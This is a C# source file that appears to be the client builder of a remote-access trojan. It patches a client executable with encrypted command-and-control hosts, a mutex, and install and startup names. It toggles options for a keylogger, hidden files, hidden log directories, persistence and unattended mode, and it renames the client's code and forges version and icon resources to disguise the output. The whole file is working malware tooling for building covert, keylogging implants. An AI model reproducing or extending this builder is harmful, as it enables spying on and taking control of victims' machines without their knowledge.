

using InvokedCommon.Cryptography;
using InvokedServer.Models;
using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Vestris.ResourceLib;


namespace InvokedServer.Build
{
	public class ClientBuilder
	{
		private readonly BuildOptions _options;
		private readonly string _clientFilePath;
		internal static readonly char[] chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();

		public ClientBuilder(BuildOptions options, string clientFilePath)
		{
			this._options = options;
			this._clientFilePath = clientFilePath;
		}

		public void Build()
		{
			using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(this._clientFilePath))
			{
				this.WriteSettings(asmDef);
				Renamer renamer = new Renamer(asmDef);
				if (!renamer.Perform())
					throw new Exception("renaming failed");
				renamer.AsmDef.Write(this._options.OutputPath);
			}
			if (this._options.AssemblyInformation != null)
			{
				VersionResource versionResource = new VersionResource();
				versionResource.LoadFrom(this._options.OutputPath);
				versionResource.FileVersion = this._options.AssemblyInformation[7];
				versionResource.ProductVersion = this._options.AssemblyInformation[6];
				versionResource.Language = (ushort)0;
				StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
				stringFileInfo["CompanyName"] = this._options.AssemblyInformation[2];
				stringFileInfo["FileDescription"] = this._options.AssemblyInformation[1];
				stringFileInfo["ProductName"] = this._options.AssemblyInformation[0];
				stringFileInfo["LegalCopyright"] = this._options.AssemblyInformation[3];
				stringFileInfo["LegalTrademarks"] = this._options.AssemblyInformation[4];
				stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
				stringFileInfo["FileVersion"] = versionResource.FileVersion;
				stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
				stringFileInfo["InternalName"] = this._options.AssemblyInformation[5];
				stringFileInfo["OriginalFilename"] = this._options.AssemblyInformation[5];
				versionResource.SaveTo(this._options.OutputPath);
			}
			if (string.IsNullOrEmpty(this._options.IconPath))
				return;
			new IconDirectoryResource(new IconFile(this._options.IconPath)).SaveTo(this._options.OutputPath);
		}

		private void WriteSettings(AssemblyDefinition asmDef)
		{
			X509Certificate2 x509Certificate2_1 = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
			X509Certificate2 x509Certificate2_2 = new X509Certificate2(x509Certificate2_1.Export(X509ContentType.Cert));
			string thumbprint = x509Certificate2_2.Thumbprint;
			Aes256 aes256 = new Aes256(thumbprint);
			byte[] inArray;
			using (RSACryptoServiceProvider privateKey = (RSACryptoServiceProvider)x509Certificate2_1.PrivateKey)
			{
				byte[] hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(thumbprint));
				inArray = privateKey.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
			}
			foreach (TypeDefinition type in asmDef.Modules[0].Types)
			{
				if (type.FullName == "InvokedClient.Config.Settings")
				{
					foreach (MethodDefinition method in type.Methods)
					{
						if (method.Name == ".cctor")
						{
							int num1 = 1;
							int num2 = 1;
							for (int index = 0; index < method.Body.Instructions.Count; ++index)
							{
								if (method.Body.Instructions[index].OpCode == OpCodes.Ldstr)
								{
									switch (num1)
									{
										case 1:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.Version);
											break;
										case 2:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.RawHosts);
											break;
										case 3:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.InstallSub);
											break;
										case 4:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.InstallName);
											break;
										case 5:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.Mutex);
											break;
										case 6:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.StartupName);
											break;
										case 7:
											method.Body.Instructions[index].Operand = (object)thumbprint;
											break;
										case 8:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.Tag);
											break;
										case 9:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(this._options.LogDirectoryName);
											break;
										case 10:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(Convert.ToBase64String(inArray));
											break;
										case 11:
											method.Body.Instructions[index].Operand = (object)aes256.Encrypt(Convert.ToBase64String(x509Certificate2_2.Export(X509ContentType.Cert)));
											break;
									}
									++num1;
								}
								else if (method.Body.Instructions[index].OpCode == OpCodes.Ldc_I4_1 || method.Body.Instructions[index].OpCode == OpCodes.Ldc_I4_0)
								{
									switch (num2)
									{
										case 1:
											method.Body.Instructions[index] = Instruction.Create(this.BoolOpCode(this._options.Install));
											break;
										case 2:
											method.Body.Instructions[index] = Instruction.Create(this.BoolOpCode(this._options.Startup));
											break;
										case 3:
											method.Body.Instructions[index] = Instruction.Create(this.BoolOpCode(this._options.HideFile));
											break;
										case 4:
											method.Body.Instructions[index] = Instruction.Create(this.BoolOpCode(this._options.Keylogger));
											break;
										case 5:
											method.Body.Instructions[index] = Instruction.Create(this.BoolOpCode(this._options.HideLogDirectory));
											break;
										case 6:
											method.Body.Instructions[index] = Instruction.Create(this.BoolOpCode(this._options.HideInstallSubdirectory));
											break;
										case 7:
											method.Body.Instructions[index] = Instruction.Create(this.BoolOpCode(this._options.UnattendedMode));
											break;
									}
									++num2;
								}
								else if (method.Body.Instructions[index].OpCode == OpCodes.Ldc_I4)
									method.Body.Instructions[index].Operand = (object)this._options.Delay;
								else if (method.Body.Instructions[index].OpCode == OpCodes.Ldc_I4_S)
									method.Body.Instructions[index].Operand = (object)this.GetSpecialFolder((int)this._options.InstallPath);
							}
						}
					}
				}
			}
		}

		public static string GetUniqueKey(int size)
		{
			byte[] data = new byte[4 * size];
			using (RandomNumberGenerator randomNumberGenerator = RandomNumberGenerator.Create())
				randomNumberGenerator.GetBytes(data);
			StringBuilder stringBuilder = new StringBuilder(size);
			for (int index1 = 0; index1 < size; ++index1)
			{
				long index2 = (long)BitConverter.ToUInt32(data, index1 * 4) % (long)ClientBuilder.chars.Length;
				stringBuilder.Append(ClientBuilder.chars[index2]);
			}
			return stringBuilder.ToString();
		}

		private OpCode BoolOpCode(bool p) => !p ? OpCodes.Ldc_I4_0 : OpCodes.Ldc_I4_1;

		private sbyte GetSpecialFolder(int installPath)
		{
			switch (installPath)
			{
				case 1:
					return 26;
				case 2:
					return 38;
				case 3:
					return 37;
				default:
					throw new ArgumentException("InstallPath");
			}
		}
	}
}